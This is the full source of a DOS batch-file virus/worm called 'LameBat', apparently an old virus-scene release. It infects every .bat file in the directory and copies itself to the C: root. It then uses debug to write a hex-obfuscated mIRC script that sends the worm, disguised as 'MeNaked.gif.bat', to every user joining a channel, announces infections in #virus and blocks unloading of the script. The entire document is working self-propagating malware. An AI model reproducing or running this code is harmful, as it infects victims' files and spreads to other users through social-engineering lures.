@echo off
goto OverThere
rem LameBat virus/worm by EXE-Gency of KrashMag
rem exegency@hotmail.com
OverThere:
echo orgy > infect1.bat
echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
echo copy %%1 + infect1.bat %%1 >> infect2.bat
echo attrib +r %%1 >> infect2.bat
echo :DontBother >> infect2.bat
attrib +r infect1.bat
attrib +r infect2.bat
for %%f in (*.bat) do call infect2 %%f
attrib -r infect1.bat
attrib -r infect2.bat
del infect1.bat
del infect2.bat
copy %0.bat c:\lamebat.bat > nul
if exist c:\mirc\mirc.ini goto mIRC
if exist c:\mirc32\mirc.ini goto mIRC32
if exist c:\progra~1\mirc\mirc.ini goto ProgramFilesmIRC
if exist c:\progra~1\mirc32\mirc.ini goto ProgramFilesmIRC32
goto NomIRC
:mIRC
set InstallDir=c:\mirc
goto InstallScript
:mIRC32
set InstallDir=c:\mirc32\script.ini
goto InstallScript
:ProgramFilesmIRC
set InstallDir=c:\progra~1\mirc\script.ini
goto InstallScript
:ProgramFilesmIRC32
set InstallDir=c:\progra~1\mirc32\script.ini
:InstallScript
echo N script.ini > script.scr
echo E 0100 5B 73 63 72 69 70 74 5D 0D 0A 6E 30 3D 6F 6E 20 >> script.scr
echo E 0110 31 3A 4A 4F 49 4E 3A 23 3A 20 7B 0D 0A 6E 31 3D >> script.scr
echo E 0120 20 20 20 20 69 66 20 28 20 24 6D 65 20 21 3D 20 >> script.scr
echo E 0130 24 6E 69 63 6B 20 29 20 7B 0D 0A 6E 32 3D 20 20 >> script.scr
echo E 0140 20 20 20 20 20 20 2F 63 6F 70 79 20 2D 6F 20 63 >> script.scr
echo E 0150 3A 5C 6C 61 6D 65 62 61 74 2E 62 61 74 20 63 3A >> script.scr
echo E 0160 5C 4D 65 4E 61 6B 65 64 2E 67 69 66 2E 62 61 74 >> script.scr
echo E 0170 0D 0A 6E 33 3D 20 20 20 20 20 20 20 20 2F 64 63 >> script.scr
echo E 0180 63 20 73 65 6E 64 20 24 6E 69 63 6B 20 63 3A 5C >> script.scr
echo E 0190 4D 65 4E 61 6B 65 64 2E 67 69 66 2E 62 61 74 0D >> script.scr
echo E 01A0 0A 6E 34 3D 20 20 20 20 7D 0D 0A 6E 35 3D 7D 0D >> script.scr
echo E 01B0 0A 6E 36 3D 6F 6E 20 31 3A 43 4F 4E 4E 45 43 54 >> script.scr
echo E 01C0 3A 20 7B 0D 0A 6E 37 3D 20 20 20 20 2F 6A 6F 69 >> script.scr
echo E 01D0 6E 20 23 76 69 72 75 73 0D 0A 6E 38 3D 20 20 20 >> script.scr
echo E 01E0 20 2F 6D 73 67 20 23 76 69 72 75 73 20 68 65 68 >> script.scr
echo E 01F0 2E 20 48 6F 77 20 64 75 6D 62 20 61 6D 20 49 3F >> script.scr
echo E 0200 0D 0A 6E 39 3D 20 20 20 20 2F 6D 73 67 20 23 76 >> script.scr
echo E 0210 69 72 75 73 20 49 20 67 6F 74 20 69 6E 66 65 63 >> script.scr
echo E 0220 74 65 64 20 77 69 74 68 20 4C 61 6D 65 42 61 74 >> script.scr
echo E 0230 20 62 79 20 45 58 45 2D 47 65 6E 63 79 0D 0A 6E >> script.scr
echo E 0240 31 30 3D 20 20 20 2F 6C 65 61 76 65 20 23 76 69 >> script.scr
echo E 0250 72 75 73 0D 0A 6E 31 31 3D 7D 0D 0A 6E 31 32 3D >> script.scr
echo E 0260 6F 6E 20 2A 3A 49 4E 50 55 54 3A 2A 3A 20 7B 0D >> script.scr
echo E 0270 0A 6E 31 33 3D 20 20 20 20 69 66 20 28 20 24 31 >> script.scr
echo E 0280 2D 20 3D 3D 20 2F 75 6E 6C 6F 61 64 20 2D 72 73 >> script.scr
echo E 0290 20 73 63 72 69 70 74 2E 69 6E 69 20 29 20 7B 0D >> script.scr
echo E 02A0 0A 6E 31 34 3D 20 20 20 20 20 20 20 20 2F 65 63 >> script.scr
echo E 02B0 68 6F 20 55 6E 61 62 6C 65 20 74 6F 20 75 6E 6C >> script.scr
echo E 02C0 6F 61 64 20 73 63 72 69 70 74 20 3A 28 0D 0A 6E >> script.scr
echo E 02D0 31 35 3D 20 20 20 20 20 20 20 20 2F 68 61 6C 74 >> script.scr
echo E 02E0 0D 0A 6E 31 36 3D 20 20 20 20 7D 0D 0A 6E 31 37 >> script.scr
echo E 02F0 3D 7D 0D 0A 6E 31 38 3D 63 74 63 70 20 31 3A 50 >> script.scr
echo E 0300 49 4E 47 3A 2F 6E 6F 74 69 63 65 20 24 6E 69 63 >> script.scr
echo E 0310 6B 20 73 74 30 30 70 69 64 20 66 75 63 6B 40 24 >> script.scr
echo E 0320 25 23 21 20 7C 20 2F 68 61 6C 74 0D 0A 0D 0A >> script.scr
echo RCX >> script.scr
echo 022F >> script.scr
echo W >> script.scr
echo Q >> script.scr
debug < script.scr > nul
copy script.ini %InstallDir% > nul
del script.ini
del script.scr
:NomIRC
